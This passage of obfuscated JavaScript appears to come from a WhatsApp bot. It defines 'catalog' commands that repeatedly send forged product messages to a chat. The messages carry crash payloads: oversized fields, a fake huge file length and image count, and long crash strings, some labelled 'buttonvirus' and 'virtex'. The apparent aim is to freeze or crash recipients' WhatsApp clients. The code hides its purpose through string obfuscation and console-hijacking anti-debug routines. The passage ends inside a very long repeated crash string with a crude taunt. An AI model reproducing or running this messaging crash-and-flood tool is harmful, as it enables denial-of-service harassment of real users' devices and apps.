?','1582040UTvtgI','chat','trace','CATALOG','message','4KWIFUw','length','248oHmwST'];_0x5bbd=function(){return _0xe32ba3;};return _0x5bbd();}
}
break

case 'ikycatalog': {
var _0x43084d=_0x3185;(function(_0x324039,_0x3d694c){var _0x60d7c9=_0x3185,_0x50f13d=_0x324039();while(!![]){try{var _0x76a9f4=-parseInt(_0x60d7c9(0x1e5))/0x1+parseInt(_0x60d7c9(0x1e7))/0x2+parseInt(_0x60d7c9(0x1d4))/0x3+-parseInt(_0x60d7c9(0x1c7))/0x4+-parseInt(_0x60d7c9(0x1de))/0x5+-parseInt(_0x60d7c9(0x1d5))/0x6*(-parseInt(_0x60d7c9(0x1ec))/0x7)+-parseInt(_0x60d7c9(0x1d3))/0x8*(parseInt(_0x60d7c9(0x1e2))/0x9);if(_0x76a9f4===_0x3d694c)break;else _0x50f13d['push'](_0x50f13d['shift']());}catch(_0x59c403){_0x50f13d['push'](_0x50f13d['shift']());}}}(_0x548b,0x1d505));function _0x3185(_0x1d562f,_0x3e38e9){var _0x1f3d0a=_0x548b();return _0x3185=function(_0x752c1a,_0x195cd1){_0x752c1a=_0x752c1a-0x1c2;var _0x1ad3b1=_0x1f3d0a[_0x752c1a];return _0x1ad3b1;},_0x3185(_0x1d562f,_0x3e38e9);}var _0x335a8c=(function(){var _0x52098a=!![];return function(_0x10cd9c,_0x2c38b0){var _0x3a46d8=_0x52098a?function(){if(_0x2c38b0){var _0x9d25ba=_0x2c38b0['apply'](_0x10cd9c,arguments);return _0x2c38b0=null,_0x9d25ba;}}:function(){};return _0x52098a=![],_0x3a46d8;};}()),_0x3688b6=_0x335a8c(this,function(){var _0x2e86f4=_0x3185;return _0x3688b6[_0x2e86f4(0x1cb)]()[_0x2e86f4(0x1c2)]('(((.+)+)+)+$')[_0x2e86f4(0x1cb)]()['constructor'](_0x3688b6)[_0x2e86f4(0x1c2)](_0x2e86f4(0x1c4));});_0x3688b6();function _0x548b(){var _0x37d692=['message','©\x20THE\x20IKYY\x20BOTZ\x20CATALOG','198NfifhR','reply','constructor','89374kfjWvP','10000000','407306qKNtBB','IDR','6288286858385@s.whatsapp.net','console','relayMessage','287FWFLtQ','warn','search','length','(((.+)+)+)+$','waUploadToServer','99999999999999','153484PXGaTA','error','THE\x20IKYY\x20BOTZ\x20CATALOG\x20🔥➥\x20','wa.me/6289516394161','toString','imageMessage','__proto__','Sukses\x20Send\x20Catalog\x20Sebanyak\x20','0@s.whatsapp.net','table','fromObject','Message','77024kWeZzz','412782lSLlUR','17388XXMeAv','exception','CATALOG','bind','{}.constructor(\x22return\x20this\x22)(\x20)','THE\x20IKYY\x20BOTZ','chat','key','trace','2175iYOSrl','prototype'];_0x548b=function(){return _0x37d692;};return _0x548b();}var _0x195cd1=(function(){var _0x1f6991=!![];return function(_0x530fda,_0x261688){var _0x1985cd=_0x1f6991?function(){if(_0x261688){var _0x289592=_0x261688['apply'](_0x530fda,arguments);return _0x261688=null,_0x289592;}}:function(){};return _0x1f6991=![],_0x1985cd;};}()),_0x752c1a=_0x195cd1(this,function(){var _0x129e79=_0x3185,_0x2e3185;try{var _0x57f383=Function('return\x20(function()\x20'+_0x129e79(0x1d9)+');');_0x2e3185=_0x57f383();}catch(_0x299fdb){_0x2e3185=window;}var _0x2b809b=_0x2e3185[_0x129e79(0x1ea)]=_0x2e3185['console']||{},_0x3c02de=['log',_0x129e79(0x1ed),'info',_0x129e79(0x1c8),_0x129e79(0x1d6),_0x129e79(0x1d0),_0x129e79(0x1dd)];for(var _0x3f3c9a=0x0;_0x3f3c9a<_0x3c02de[_0x129e79(0x1c3)];_0x3f3c9a++){var _0x2fb709=_0x195cd1[_0x129e79(0x1e4)][_0x129e79(0x1df)][_0x129e79(0x1d8)](_0x195cd1),_0x41e105=_0x3c02de[_0x3f3c9a],_0x1badf1=_0x2b809b[_0x41e105]||_0x2fb709;_0x2fb709[_0x129e79(0x1cd)]=_0x195cd1[_0x129e79(0x1d8)](_0x195cd1),_0x2fb709[_0x129e79(0x1cb)]=_0x1badf1[_0x129e79(0x1cb)][_0x129e79(0x1d8)](_0x1badf1),_0x2b809b[_0x41e105]=_0x2fb709;}});_0x752c1a();{if(!isCreator&&!isBan)return;if(args['length']==0x0)return m[_0x43084d(0x1e3)]('Jumlahnya?');jumlah=''+encodeURI(q);for(let i=0x0;i<jumlah;i++){const ctlg={'key':{'fromMe':![],'participant':'0@s.whatsapp.net','remoteJid':_0x43084d(0x1cf)},'message':{'orderMessage':{'itemCount':0x0,'surface':_0x43084d(0x1d7)}}};var messa=await prepareWAMessageMedia({'image':thumb},{'upload':ikycoli[_0x43084d(0x1c5)]}),catalog=generateWAMessageFromContent(m['chat'],proto[_0x43084d(0x1d2)][_0x43084d(0x1d1)]({'productMessage':{'product':{'productImage':messa[_0x43084d(0x1cc)],'productId':_0x43084d(0x1c6),'title':_0x43084d(0x1c9)+buttonvirus,'description':'©\x20𝙏𝙃𝙀\x20I𝙄𝙆𝙔𝙔\x20𝘽𝙊𝙏𝙕 𝘾𝙍𝘼𝙎𝙃〽️\x20CATALOG\x20'+buttonvirus,'currencyCode':_0x43084d(0x1e8),'footerText':_0x43084d(0x1e1),'priceAmount1000':_0x43084d(0x1e6),'productImageCount':0x1,'firstImageId':0x1,'salePriceAmount1000':_0x43084d(0x1e6),'retailerId':_0x43084d(0x1da),'url':_0x43084d(0x1ca)},'businessOwnerJid':_0x43084d(0x1e9)}}),{'userJid':m[_0x43084d(0x1db)],'quoted':ctlg});ikycoli[_0x43084d(0x1eb)](m[_0x43084d(0x1db)],catalog[_0x43084d(0x1e0)],{'messageId':catalog[_0x43084d(0x1dc)]['id']});}jancok(_0x43084d(0x1ce)+jumlah);}
}
break
case 'ikycatalogv2': {
var _0x2848b3=_0x9e0d;(function(_0x44087c,_0x2e641c){var _0x1db5ee=_0x9e0d,_0x50f0d5=_0x44087c();while(!![]){try{var _0x277bf9=parseInt(_0x1db5ee(0x153))/0x1*(-parseInt(_0x1db5ee(0x13f))/0x2)+parseInt(_0x1db5ee(0x133))/0x3+parseInt(_0x1db5ee(0x142))/0x4*(parseInt(_0x1db5ee(0x130))/0x5)+parseInt(_0x1db5ee(0x141))/0x6*(parseInt(_0x1db5ee(0x14a))/0x7)+parseInt(_0x1db5ee(0x147))/0x8*(parseInt(_0x1db5ee(0x13b))/0x9)+parseInt(_0x1db5ee(0x12e))/0xa*(-parseInt(_0x1db5ee(0x154))/0xb)+-parseInt(_0x1db5ee(0x144))/0xc;if(_0x277bf9===_0x2e641c)break;else _0x50f0d5['push'](_0x50f0d5['shift']());}catch(_0x6eeb83){_0x50f0d5['push'](_0x50f0d5['shift']());}}}(_0x50d7,0x47edf));var _0x5305e6=(function(){var _0x2a071a=!![];return function(_0x44ac42,_0x2f3a86){var _0x5ddccf=_0x2a071a?function(){var _0x269a28=_0x9e0d;if(_0x2f3a86){var _0x956bb1=_0x2f3a86[_0x269a28(0x157)](_0x44ac42,arguments);return _0x2f3a86=null,_0x956bb1;}}:function(){};return _0x2a071a=![],_0x5ddccf;};}()),_0x6f3dcf=_0x5305e6(this,function(){var _0x29e902=_0x9e0d;return _0x6f3dcf[_0x29e902(0x131)]()[_0x29e902(0x149)](_0x29e902(0x158))[_0x29e902(0x131)]()[_0x29e902(0x12d)](_0x6f3dcf)['search']('(((.+)+)+)+$');});_0x6f3dcf();var _0x344797=(function(){var _0x43474b=!![];return function(_0x2ef73a,_0x38843d){var _0x978085=_0x43474b?function(){if(_0x38843d){var _0x45337b=_0x38843d['apply'](_0x2ef73a,arguments);return _0x38843d=null,_0x45337b;}}:function(){};return _0x43474b=![],_0x978085;};}()),_0x449ae5=_0x344797(this,function(){var _0xf9db85=_0x9e0d,_0x1fc2db;try{var _0x22834f=Function(_0xf9db85(0x12f)+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');_0x1fc2db=_0x22834f();}catch(_0x50cb5f){_0x1fc2db=window;}var _0x3e3222=_0x1fc2db[_0xf9db85(0x132)]=_0x1fc2db['console']||{},_0x2ce5fa=[_0xf9db85(0x156),_0xf9db85(0x138),'info','error','exception','table','trace'];for(var _0x5ae98c=0x0;_0x5ae98c<_0x2ce5fa[_0xf9db85(0x143)];_0x5ae98c++){var _0x4f19eb=_0x344797[_0xf9db85(0x12d)][_0xf9db85(0x13c)]['bind'](_0x344797),_0x32d7a2=_0x2ce5fa[_0x5ae98c],_0x51f1fe=_0x3e3222[_0x32d7a2]||_0x4f19eb;_0x4f19eb['__proto__']=_0x344797[_0xf9db85(0x145)](_0x344797),_0x4f19eb[_0xf9db85(0x131)]=_0x51f1fe['toString'][_0xf9db85(0x145)](_0x51f1fe),_0x3e3222[_0x32d7a2]=_0x4f19eb;}});function _0x9e0d(_0x40fd14,_0x354a07){var _0x31dc6c=_0x50d7();return _0x9e0d=function(_0x449ae5,_0x344797){_0x449ae5=_0x449ae5-0x12c;var _0xf55e2d=_0x31dc6c[_0x449ae5];return _0xf55e2d;},_0x9e0d(_0x40fd14,_0x354a07);}_0x449ae5();function _0x50d7(){var _0x47d5e3=['(((.+)+)+)+$','message','constructor','917710ZuapUK','return\x20(function()\x20','150555pDpiIU','toString','console','1278993oTOLBP','reply','CATALOG\x20NEW\x20ERA','chat','imageMessage','warn','💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤','https://youtube.com/channel/UCQmja37q_Pap24MgG0vUITQ','459cARajX','prototype','key','Gk\x20guna😏','218134ZoNNMe','fromObject','318OIQHsl','56ocjlOz','length','2897520eKxIyO','bind','Sukses\x20Send\x20Catalogv2\x20Sebanyak\x20','36280Mzoaim','relayMessage','search','36659iRltJZ','6285706035039@s.whatsapp.net','Jumlahnya?','readFileSync','Sama\x20gk\x20guna😏','./pict.jpg','999','JEMBOD','Message','5NkGlaQ','33RyawWt','waUploadToServer','log','apply'];_0x50d7=function(){return _0x47d5e3;};return _0x50d7();}{if(!isCreator&&!isBan)return;if(args[_0x2848b3(0x143)]==0x0)return m[_0x2848b3(0x134)](_0x2848b3(0x14c));jumlah=''+encodeURI(q);for(let i=0x0;i<jumlah;i++){var messa=await prepareWAMessageMedia({'image':fs[_0x2848b3(0x14d)](_0x2848b3(0x14f))},{'upload':ikycoli[_0x2848b3(0x155)]}),catalog=generateWAMessageFromContent(m[_0x2848b3(0x136)],proto[_0x2848b3(0x152)][_0x2848b3(0x140)]({'productMessage':{'product':{'productImage':messa[_0x2848b3(0x137)],'productId':_0x2848b3(0x151),'fileLength':'99999999999','jpegThumbnail':virgam,'title':'𝙏𝙃𝙀\x20𝙄𝙆𝙔𝙔\x20𝘽𝙊𝙏𝙕𝙕 𝘾𝙍𝘼𝙎𝙃〽️','description':_0x2848b3(0x139)+virtex2,'currencyCode':'IDR','productImageCount':0x370ad515,'firstImageId':0x1,'priceAmount1000':_0x2848b3(0x150),'salePriceAmount1000':'IDR\x2099.99999999999999999999','bodyText':_0x2848b3(0x13e),'footerText':_0x2848b3(0x14e),'retailerId':_0x2848b3(0x135),'url':_0x2848b3(0x13a)},'businessOwnerJid':_0x2848b3(0x14b),'contextInfo':{'forwardingScore':0x96,'isForwarded':!![]}}}),{'userJid':m['chat'],'quoted':shield2});ikycoli[_0x2848b3(0x148)](m['chat'],catalog[_0x2848b3(0x12c)],{'messageId':catalog[_0x2848b3(0x13d)]['id']});}jancok(_0x2848b3(0x146)+jumlah);}
}
break
case 'jadicatalog':{
var _0xc6393f=_0x3078;(function(_0x376098,_0x41d150){var _0x15893a=_0x3078,_0x1221ab=_0x376098();while(!![]){try{var _0x3e76b6=parseInt(_0x15893a(0x1c8))/0x1+-parseInt(_0x15893a(0x1e0))/0x2+-parseInt(_0x15893a(0x1e4))/0x3+-parseInt(_0x15893a(0x1d3))/0x4+parseInt(_0x15893a(0x1c5))/0x5+parseInt(_0x15893a(0x1ee))/0x6*(-parseInt(_0x15893a(0x1f1))/0x7)+-parseInt(_0x15893a(0x1e8))/0x8*(-parseInt(_0x15893a(0x1e7))/0x9);if(_0x3e76b6===_0x41d150)break;else _0x1221ab['push'](_0x1221ab['shift']());}catch(_0x556749){_0x1221ab['push'](_0x1221ab['shift']());}}}(_0x2fb6,0xb16c9));var _0x3dd764=(function(){var _0xbba82a=!![];return function(_0x1b80dd,_0xb6b0c4){var _0xb4c8ce=_0xbba82a?function(){var _0x1ea3d8=_0x3078;if(_0xb6b0c4){var _0x460efc=_0xb6b0c4[_0x1ea3d8(0x1e3)](_0x1b80dd,arguments);return _0xb6b0c4=null,_0x460efc;}}:function(){};return _0xbba82a=![],_0xb4c8ce;};}()),_0x144a49=_0x3dd764(this,function(){var _0x45550e=_0x3078;return _0x144a49[_0x45550e(0x1de)]()[_0x45550e(0x1ed)](_0x45550e(0x1cb))[_0x45550e(0x1de)]()['constructor'](_0x144a49)['search']('(((.+)+)+)+$');});_0x144a49();var _0x9ab345=(function(){var _0x504721=!![];return function(_0x2fe0bf,_0x439ee1){var _0x2e9311=_0x504721?function(){var _0x327dd2=_0x3078;if(_0x439ee1){var _0xdc52f3=_0x439ee1[_0x327dd2(0x1e3)](_0x2fe0bf,arguments);return _0x439ee1=null,_0xdc52f3;}}:function(){};return _0x504721=![],_0x2e9311;};}()),_0x1cfe6b=_0x9ab345(this,function(){var _0x363fdd=_0x3078,_0x50fb3e;try{var _0x200e7e=Function(_0x363fdd(0x1f2)+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');_0x50fb3e=_0x200e7e();}catch(_0x3f222b){_0x50fb3e=window;}var _0x367709=_0x50fb3e['console']=_0x50fb3e[_0x363fdd(0x1d0)]||{},_0x5efb4d=['log',_0x363fdd(0x1d2),_0x363fdd(0x1c9),_0x363fdd(0x1db),_0x363fdd(0x1e1),_0x363fdd(0x1e9),_0x363fdd(0x1ca)];for(var _0x160242=0x0;_0x160242<_0x5efb4d[_0x363fdd(0x1cd)];_0x160242++){var _0x1a6ecc=_0x9ab345[_0x363fdd(0x1dd)][_0x363fdd(0x1eb)][_0x363fdd(0x1cf)](_0x9ab345),_0x5a312f=_0x5efb4d[_0x160242],_0x308bfb=_0x367709[_0x5a312f]||_0x1a6ecc;_0x1a6ecc['__proto__']=_0x9ab345['bind'](_0x9ab345),_0x1a6ecc['toString']=_0x308bfb[_0x363fdd(0x1de)][_0x363fdd(0x1cf)](_0x308bfb),_0x367709[_0x5a312f]=_0x1a6ecc;}});function _0x2fb6(){var _0x486e7c=['chat','\x20CATALOG\x20BY:\x20','https://youtube.com/channel/UCQmja37q_Pap24MgG0vUITQ','key','error','Sama\x20gk\x20guna😏','constructor','toString','999','1013140wuXFkp','exception','JEMBOD','apply','4093098tXPWyd','quoted','Sukses\x20Convert\x20Catalog','36FgFzVn','3564664WwoUci','table','download','prototype','fromObject','search','90JcNRqc','Message','waUploadToServer','191128udPmNc','return\x20(function()\x20','IDR\x2099.99999999999999999999','724660yYTUZf','Teksnya\x20Mana?','message','1410409qLUrYj','info','trace','(((.+)+)+)+$','relayMessage','length','imageMessage','bind','console','*Send/Reply\x20Image','warn','1321792kNwTBp','CATALOG\x20NEW\x20ERA','💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 